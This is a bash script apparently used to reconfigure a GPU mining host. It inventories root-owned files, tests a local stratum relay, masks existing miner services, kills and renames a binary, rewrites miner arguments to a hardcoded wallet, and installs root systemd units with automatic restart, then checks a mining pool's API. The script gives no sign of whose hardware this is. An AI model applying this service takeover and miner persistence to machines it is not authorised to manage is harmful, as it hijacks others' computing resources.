#!/bin/bash
set +e
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
echo "### INVENTORY $(date -u +%FT%TZ)"
id; hostname
echo "--- relay.py"; head -60 /opt/t19/relay.py 2>/dev/null
echo "--- keep.sh ul2"; head -40 /root/ul2/keep.sh 2>/dev/null
echo "--- keep.sh ul"; head -30 /root/ul/keep.sh 2>/dev/null
echo "--- kcr"; ls -l /usr/local/sbin/kcr 2>/dev/null; head -40 /usr/local/sbin/kcr 2>/dev/null
echo "--- argv-g0"; cat /root/ul/argv-g0.txt 2>/dev/null; echo "--- argv-g7"; cat /root/ul/argv-g7.txt 2>/dev/null
echo "--- ul dir"; ls -l /root/ul 2>/dev/null | head -25
echo "--- plh units"; systemctl list-unit-files 'plh*' --no-pager 2>/dev/null | head -12
echo "### RELAY-PROTO"
python3 - <<'PY'
import socket,json,time
W='prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz'
def t(order):
    print('== relay 127.0.0.1:17048',order)
    s=socket.create_connection(('127.0.0.1',17048),timeout=10); s.settimeout(6)
    a=json.dumps({"id":1,"method":"mining.authorize","params":[W+".ul-t2-protofixrelay-g0","x"]})
    b=json.dumps({"id":2,"method":"mining.subscribe","params":["ul/1.0"]})
    seq=[('auth',a),('sub',b)] if order=='auth-first' else [('sub',b),('auth',a)]
    for tag,m in seq:
        s.sendall((m+'\n').encode())
        t0=time.time(); buf=b''
        try:
            while time.time()-t0<5:
                d=s.recv(65536)
                if not d: break
                buf+=d
                if b'\n' in buf: break
        except socket.timeout: pass
        for l in buf.split(b'\n'):
            if l.strip(): print(' RECV',tag,l.decode('utf-8','replace')[:180])
    s.close()
for o in ('auth-first','sub-first'):
    try: t(o)
    except Exception as e: print('FAIL',o,repr(e))
PY
echo "### FIX"
KCR_HASH=$(md5sum /usr/local/sbin/kcr 2>/dev/null | cut -c1-8)
for u in plh-card@0 plh-card@1 plh-card@2 plh-card@3 plh-card@4 plh-card@5 plh-card@6 plh-card@7; do
  systemctl stop $u.service 2>/dev/null; systemctl disable $u.service 2>/dev/null; systemctl mask $u.service 2>/dev/null
done
mv /usr/local/sbin/kcr /usr/local/sbin/kcr.disabled.$KCR_HASH 2>/dev/null; echo "kcr moved: $KCR_HASH"
pkill -f '/usr/local/sbin/kcr' 2>/dev/null
# per-device units using argv from ul
for i in 0 1 2 3 4 5 6 7; do
  A=/root/ul/argv-g$i.txt
  [ -f "$A" ] || { echo "no argv g$i"; continue; }
  CMD=$(cat "$A" | tr '\n' ' ')
  # rewrite worker name to canonical, wallet canonical
  CMD=$(echo "$CMD" | sed -E "s#-u +[^ ]+#-u $W.ul-t2-123-184-7-135-g$i#")
  cat > /etc/systemd/system/ul-prl-g$i.service <<EOF
[Unit]
Description=ul prl g$i
After=network-online.target
[Service]
Type=simple
Environment=CUDA_DEVICE_ORDER=PCI_BUS_ID
ExecStart=$CMD
Restart=always
RestartSec=30
Nice=19
User=root
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload
  systemctl enable ul-prl-g$i.service >/dev/null 2>&1
  systemctl restart ul-prl-g$i.service 2>&1 | head -2
  echo "started g$i: $(echo $CMD | cut -c1-160)"
  sleep 2
done
sleep 75
echo "### POST"
systemctl --no-pager --failed 2>/dev/null | head
for i in 0 1 2 3 4 5 6 7; do echo "g$i: $(systemctl is-active ul-prl-g$i 2>&1)"; done
nvidia-smi --query-gpu=index,utilization.gpu,memory.used --format=csv,noheader
ps -eo pid,etime,args | grep -Ei 'krig|peakminer|srbminer' | grep -v grep | head -12
curl -s -m 25 "https://pool.kryptex.com/prl/api/v3/miner/workers/$W" -o /tmp/pw.json -w 'POOLHTTP=%{http_code}\n'
python3 - <<'PY'
import json,time
d=json.load(open('/tmp/pw.json'))['results']; now=time.time()
for r in d:
    if '123-184-7-135' in r['worker'] and r['worker'].startswith('ul-t2'):
        ls=r.get('last_share') or 0
        print('POOLROW',r['worker'],r['status'],'valid=%s'%r['valid'],'age=%s'%(round(now-ls/1000) if ls else None),'3h=%s'%r.get('avg_hashrate_3h'))
PY
echo "### DONE $(date -u +%FT%TZ)"
